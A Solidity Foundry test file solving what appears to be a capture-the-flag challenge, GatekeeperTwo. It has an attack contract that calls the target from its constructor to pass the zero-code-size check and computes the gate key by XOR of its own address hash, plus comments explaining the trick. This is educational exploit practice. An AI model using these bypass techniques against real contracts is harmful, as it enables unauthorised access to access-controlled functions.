// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

/*
-------------------------------
 ATTACK CONTRACT
-------------------------------
*/
contract AttackGatekeeperTwo {
    GatekeeperTwo public gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);

/*
        1. extcodesize(address): This function returns the size of the code at a given address.
        2. caller(): Returns the address of the caller.
        For this gate, the code size of the caller must be zero.
        This is typically true for EOAs since they don’t have associated code,
        but since gate one requires a contract to call this function, how can a contract have a code size of zero?

        When a contract is being deployed, it has two stages:

        1. Creation Bytecode: This is the bytecode needed to create the contract and execute its constructor.
        2. Runtime Bytecode: This is the actual code that runs the contract’s functions once deployed.
        During the contract’s construction (before its constructor finishes executing),
        the contract’s runtime code isn’t yet stored on the blockchain. Therefore, its code size is zero during this period.
*/

        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
            ^ type(uint64).max
        );

        (bool success,) = _gatekeeperTwo.call(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success, "Call failed");
    }
}

/*
-------------------------------
 TEST
-------------------------------
*/
contract GatekeeperTwoTest is Test {
    GatekeeperTwo public gatekeeperTwo;

    address public attacker = address(0xBEEF);

    function setUp() public {
        gatekeeperTwo = new GatekeeperTwo();
    }

    function testGatekeeperAttack() public {
        vm.startPrank(attacker, attacker);

        new AttackGatekeeperTwo(address(gatekeeperTwo));
        assertEq(gatekeeperTwo.entrant(), attacker);

        vm.stopPrank();
    }

}